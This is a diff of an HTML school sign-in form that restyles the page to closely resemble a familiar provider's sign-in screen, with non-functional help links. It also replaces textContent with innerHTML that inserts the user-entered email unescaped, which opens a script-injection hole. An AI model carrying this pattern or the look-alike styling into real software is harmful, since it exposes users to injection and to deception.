@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>School Auth Form</title>
+    <title>School Registration</title>
     <style>
         * {
             margin: 0;
@@ -12,119 +12,145 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+            background-color: #ffffff;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
         }
 
         .container {
             width: 100%;
-            max-width: 450px;
+            max-width: 520px;
+            padding: 0 40px;
         }
 
         .header {
             text-align: center;
-            margin-bottom: 48px;
+            margin-bottom: 50px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         .logo {
-            width: 50px;
-            height: 50px;
+            width: 70px;
+            height: 70px;
             background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 24px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease;
-        }
-
-        .logo:hover {
-            transform: scale(1.05);
+            margin-bottom: 30px;
         }
 
         .logo svg {
-            width: 28px;
-            height: 28px;
+            width: 40px;
+            height: 40px;
             color: white;
             stroke: white;
             fill: none;
-            stroke-width: 2;
+            stroke-width: 1.5;
         }
 
         h1 {
-            font-size: 36px;
-            font-weight: 700;
-            color: #0f172a;
+            font-size: 32px;
+            font-weight: 400;
+            color: #202124;
             margin-bottom: 8px;
+            letter-spacing: -0.5px;
         }
 
-        .email-display {
-            color: #475569;
+        .description {
             font-size: 14px;
-            margin-top: 8px;
+            color: #5f6368;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .help-link {
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            margin-bottom: 40px;
+            display: inline-block;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
         }
 
         .form-section {
             display: none;
+            width: 100%;
         }
 
         .form-section.active {
             display: block;
         }
 
-        .form-description {
-            color: #475569;
-            font-size: 14px;
-            text-align: center;
+        .input-wrapper {
             margin-bottom: 24px;
-            line-height: 1.5;
+            position: relative;
         }
 
-        form {
-            margin-bottom: 24px;
-        }
-
-        .form-group {
-            display: flex;
-            flex-direction: column;
-            margin-bottom: 24px;
-        }
-
-        .form-group-double {
+        .input-group {
             display: flex;
             flex-direction: column;
             gap: 16px;
+            margin-bottom: 24px;
         }
 
-        input {
-            padding: 12px 16px;
-            border: 2px solid #cbd5e1;
-            border-radius: 8px;
+        input[type="email"],
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
             font-size: 16px;
-            color: #0f172a;
-            transition: border-color 0.3s ease;
+            color: #202124;
             font-family: inherit;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
 
         input::placeholder {
-            color: #94a3b8;
+            color: #80868b;
         }
 
         input:focus {
             outline: none;
-            border-color: #2563eb;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.1);
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 16px;
+        }
+
+        input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #1a73e8;
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: #202124;
+            cursor: pointer;
         }
 
         .error-message {
-            color: #dc2626;
-            font-size: 14px;
-            text-align: center;
+            color: #d33b27;
+            font-size: 13px;
             margin-bottom: 16px;
             display: none;
         }
@@ -133,49 +159,57 @@
             display: block;
         }
 
-        .form-actions {
+        .footer-links {
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            padding-top: 16px;
+            align-items: center;
+            margin-top: 40px;
         }
 
-        .link-button {
-            background: none;
-            border: none;
-            color: #2563eb;
-            font-weight: 500;
+        .footer-left {
+            display: flex;
+            gap: 30px;
+        }
+
+        .footer-link {
             font-size: 14px;
-            cursor: pointer;
+            color: #1a73e8;
             text-decoration: none;
-            transition: text-decoration 0.3s ease;
+            cursor: pointer;
+            border: none;
+            background: none;
+            padding: 0;
             font-family: inherit;
         }
 
-        .link-button:hover {
+        .footer-link:hover {
             text-decoration: underline;
         }
 
         .submit-button {
-            padding: 12px 32px;
-            background-color: #2563eb;
+            padding: 10px 30px;
+            background-color: #1a73e8;
             color: white;
             font-weight: 500;
             border: none;
-            border-radius: 8px;
+            border-radius: 4px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            font-size: 16px;
+            font-size: 14px;
             font-family: inherit;
+            transition: background-color 0.2s, box-shadow 0.2s;
         }
 
         .submit-button:hover {
-            background-color: #1d4ed8;
+            background-color: #1765cc;
+            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
+        }
+
+        .submit-button:active {
+            background-color: #1552b8;
         }
 
         .submit-button:disabled {
-            opacity: 0.5;
+            background-color: #c5c5c5;
             cursor: not-allowed;
         }
 
@@ -183,21 +217,22 @@
         .loading-container {
             display: none;
             text-align: center;
-            padding: 60px 20px;
-        }
-
-        .loading-container.active {
+            min-height: 500px;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
         }
 
+        .loading-container.active {
+            display: flex;
+        }
+
         .spinner {
-            width: 60px;
-            height: 60px;
-            margin-bottom: 32px;
-            animation: spin 1s linear infinite;
+            width: 50px;
+            height: 50px;
+            margin-bottom: 24px;
+            animation: spin 0.8s linear infinite;
         }
 
         .spinner svg {
@@ -215,23 +250,38 @@
         }
 
         .loading-text {
-            color: #475569;
-            font-size: 18px;
-            font-weight: 500;
+            color: #5f6368;
+            font-size: 16px;
         }
 
-        /* Responsive Design */
-        @media (max-width: 600px) {
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 24px;
+            }
+
             h1 {
                 font-size: 28px;
             }
 
-            .header {
-                margin-bottom: 32px;
+            .footer-links {
+                flex-direction: column;
+                gap: 20px;
             }
 
-            input {
-                font-size: 16px;
+            .footer-left {
+                flex-direction: column;
+                gap: 16px;
+                width: 100%;
+            }
+
+            .submit-button {
+                width: 100%;
+            }
+
+            .footer-link {
+                width: 100%;
+                text-align: left;
             }
         }
     </style>
@@ -246,53 +296,71 @@
                 </svg>
             </div>
             <h1 id="headerTitle">Sign in</h1>
-            <div class="email-display" id="emailDisplay"></div>
+            <div id="emailDisplay"></div>
         </div>
 
-        <!-- Step 1: Email Form -->
+        <!-- Step 1: Email -->
         <div class="form-section active" id="step1">
-            <p class="form-description">Use your email address. The information will be added to our system.</p>
+            <p class="description">Use your email or phone number to sign in to your school account.</p>
+
             <form onsubmit="handleEmailNext(event)">
-                <div class="form-group">
+                <div class="input-wrapper">
                     <input 
                         type="email" 
                         id="emailInput" 
-                        placeholder="Email or phone" 
+                        placeholder="Email or phone"
                         required
                     />
                 </div>
 
                 <div class="error-message" id="errorMessage"></div>
 
-                <div class="form-actions">
-                    <button type="button" class="link-button" onclick="goToStep(1)">Create account</button>
+                <a href="#" class="help-link" onclick="return false;">Forgot email?</a>
+
+                <div style="margin-top: 60px;"></div>
+
+                <a href="#" class="help-link" onclick="return false;">Create account</a>
+
+                <div class="footer-links">
+                    <div class="footer-left"></div>
                     <button type="submit" class="submit-button">Next</button>
                 </div>
             </form>
         </div>
 
-        <!-- Step 2: School Details Form -->
+        <!-- Step 2: School Details -->
         <div class="form-section" id="step2">
             <form onsubmit="handleSubmit(event)">
-                <div class="form-group-double">
+                <div class="input-group">
                     <input 
                         type="text" 
                         id="schoolInput" 
-                        placeholder="School name" 
+                        placeholder="School name"
                         required
                     />
                     <input 
                         type="text" 
                         id="departmentInput" 
-                        placeholder="Department" 
+                        placeholder="Department"
                         required
                     />
                 </div>
 
                 <div class="error-message" id="errorMessage2"></div>
 
-                <div class="form-actions">
-                    <button type="button" class="link-button" onclick="goToStep(1)">Back</button>
+                <div class="checkbox-wrapper">
+                    <input type="checkbox" id="showPassword">
+                    <label for="showPassword" class="checkbox-label">Show information</label>
+                </div>
+
+                <a href="#" class="help-link" style="margin-top: 30px;" onclick="return false;">Need help signing in?</a>
+
+                <div style="margin-top: 40px;"></div>
+
+                <div class="footer-links">
+                    <div class="footer-left">
+                        <button type="button" class="footer-link" onclick="goToStep(1)">Back</button>
+                    </div>
                     <button type="submit" class="submit-button" id="submitBtn">Next</button>
                 </div>
             </form>
@@ -301,9 +369,9 @@
         <!-- Loading State -->
         <div class="loading-container" id="loadingContainer">
             <div class="spinner">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2">
-                    <circle cx="12" cy="12" r="10" opacity="0.25"></circle>
-                    <path d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" fill="#2563eb" opacity="0.75"></path>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" opacity="0.2"></circle>
+                    <path d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" fill="#1a73e8"></path>
                 </svg>
             </div>
             <p class="loading-text">Processing your information...</p>
@@ -346,7 +414,7 @@
             const errorMessage = document.getElementById('errorMessage');
 
             if (!emailInput.value.trim()) {
-                errorMessage.textContent = 'Please enter your email';
+                errorMessage.textContent = 'Enter a valid email or phone number';
                 errorMessage.classList.add('show');
                 return;
             }
@@ -397,7 +465,7 @@
 
         // Update UI based on current step
         function updateUI() {
-            // Hide all form sections
+            // Hide all sections
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.remove('active');
             document.getElementById('loadingContainer').classList.remove('active');
@@ -409,12 +477,17 @@
             if (currentStep === 1) {
                 document.getElementById('step1').classList.add('active');
                 headerTitle.textContent = 'Sign in';
-                emailDisplay.textContent = '';
+                emailDisplay.innerHTML = '';
                 document.getElementById('emailInput').focus();
             } else if (currentStep === 2) {
                 document.getElementById('step2').classList.add('active');
                 headerTitle.textContent = 'Welcome';
-                emailDisplay.textContent = userEmail;
+                emailDisplay.innerHTML = `<div style="font-size: 16px; color: #5f6368; margin-top: 8px;">
+                    <svg style="width: 18px; height: 18px; vertical-align: middle; margin-right: 8px;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#5f6368">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                    </svg>
+                    ${userEmail}
+                </div>`;
                 document.getElementById('schoolInput').focus();
             }
         }
